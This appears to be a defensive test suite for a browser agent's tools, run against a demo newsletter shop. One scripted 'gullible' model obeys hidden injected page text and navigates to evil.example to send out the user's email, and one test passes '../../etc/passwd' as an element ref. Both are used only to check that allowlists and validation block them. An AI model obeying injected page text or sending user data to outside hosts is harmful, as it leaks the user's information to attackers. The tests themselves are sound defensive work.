// These tests drive a REAL browser against an in-memory demo shop. They skip themselves if no Chrome/Chromium/Edge is found.
import assert from "node:assert/strict";
import { test } from "node:test";
import { runAgent, type Tool } from "../../level-5/lib/agent.ts";
import { scripted, textReply, toolReply } from "../../level-5/lib/fake-model.ts";
import { INJECTION, SHOP, browserTools, findBrowser, openShop } from "./browser-tools.ts";

const skip = findBrowser() ? false : "no browser found (set BROWSER_PATH)";
const ALLOWED = ["shop.example"];

/** Pull the ref for an element out of the latest snapshot the model has seen. */
const refFor = (req: { messages: { content: unknown }[] }, role: string, name: string): string => {
  const results = req.messages.flatMap((m) => (Array.isArray(m.content) ? m.content : [])).filter((b) => (b as { type?: string }).type === "tool_result") as { content: string }[];
  const snap = [...results].reverse().find((r) => String(r.content).includes("[ref="))!.content;
  const line = snap.split("\n").find((l) => l.includes(`${role} "${name}"`));
  const ref = line?.match(/\[ref=(e\d+)\]/)?.[1];
  assert.ok(ref, `no ${role} "${name}" in the snapshot`);
  return ref;
};

test("an agent subscribes to the newsletter by reading the accessibility tree and acting on refs", { skip }, async () => {
  const shop = await openShop();
  try {
    const model = scripted([
      toolReply([{ name: "snapshot", input: {} }]),
      (req) => toolReply([{ name: "fill", input: { ref: refFor(req, "textbox", "Email"), text: "ada@example.com" } }]),
      (req) => toolReply([{ name: "select", input: { ref: refFor(req, "combobox", "Plan"), value: "Pro" } }]),
      (req) => toolReply([{ name: "click", input: { ref: refFor(req, "button", "Subscribe") } }]),
      textReply("Subscribed ada@example.com to the Pro plan."),
    ]);
    const r = await runAgent({ system: "s", task: "Subscribe ada@example.com to the Pro plan.", call: model, tools: browserTools(shop.page, { allowedHosts: ALLOWED }) });
    assert.equal(r.finished, true);
    assert.equal(await shop.page.locator("#out").innerText(), "Thanks, ada@example.com! Plan: Pro"); // graded on the OUTCOME in the page
  } finally { await shop.close(); }
});

test("the snapshot is text with refs, and shows hidden text too (that is how injection reaches the model)", { skip }, async () => {
  const shop = await openShop({ inject: true });
  try {
    const snap = (await browserTools(shop.page, { allowedHosts: ALLOWED })[0]!.run({})) as string;
    assert.match(snap, /heading "Acme Newsletter"/);
    assert.match(snap, /textbox "Email" \[ref=e\d+\]/);
    assert.ok(snap.includes(INJECTION), "text moved off-screen is still in the accessibility tree");
  } finally { await shop.close(); }
});

test("prompt injection: an obedient model is stopped by the tool, and nothing leaves the browser", { skip }, async () => {
  const shop = await openShop({ inject: true });
  try {
    const gullible = scripted([
      toolReply([{ name: "snapshot", input: {} }]),
      toolReply([{ name: "navigate", input: { url: "https://evil.example/collect?email=ada@example.com" } }]), // obeys the hidden text
      textReply("I could not reach that site."),
    ]);
    const r = await runAgent({ system: "s", task: "Subscribe ada@example.com", call: gullible, tools: browserTools(shop.page, { allowedHosts: ALLOWED }) });
    const result = (r.messages.at(-2)!.content as unknown as { is_error?: boolean; content: string }[])[0]!;
    assert.equal(result.is_error, true);
    assert.match(result.content, /evil\.example is not allowed/);
    assert.deepEqual(shop.blocked, [], "the tool refused before any request was made");
  } finally { await shop.close(); }
});

test("defense in depth: even a direct navigation that bypasses the tool is aborted at the network layer", { skip }, async () => {
  const shop = await openShop();
  try {
    await assert.rejects(shop.page.goto("https://evil.example/collect", { timeout: 3000 }));
    assert.deepEqual(shop.blocked, ["https://evil.example/collect"]);
  } finally { await shop.close(); }
});

test("an allowed navigation works and returns the new page", { skip }, async () => {
  const shop = await openShop();
  try {
    const navigate = browserTools(shop.page, { allowedHosts: ALLOWED }).find((t) => t.name === "navigate")!;
    assert.match((await navigate.run({ url: `${SHOP}/pricing` })) as string, /heading "Pricing"/);
  } finally { await shop.close(); }
});

test("bad refs and bad URLs come back as messages the model can act on", { skip }, async () => {
  const shop = await openShop();
  try {
    const tools = browserTools(shop.page, { allowedHosts: ALLOWED });
    const by = (n: string): Tool => tools.find((t) => t.name === n)!;
    await assert.rejects(async () => by("click").run({ ref: "../../etc/passwd" }), /ref: ref must look like e5/);
    await assert.rejects(async () => by("click").run({ ref: "e9999" }), /click e9999 failed.*new snapshot/);
    await assert.rejects(async () => by("navigate").run({ url: "http://shop.example/" }), /not a valid https URL/);
  } finally { await shop.close(); }
});

test("a huge page is truncated with a notice, not silently", { skip }, async () => {
  const shop = await openShop();
  try {
    const snap = (await browserTools(shop.page, { allowedHosts: ALLOWED, maxChars: 80 })[0]!.run({})) as string;
    assert.match(snap, /\[truncated: \d+ chars in total/);
  } finally { await shop.close(); }
});
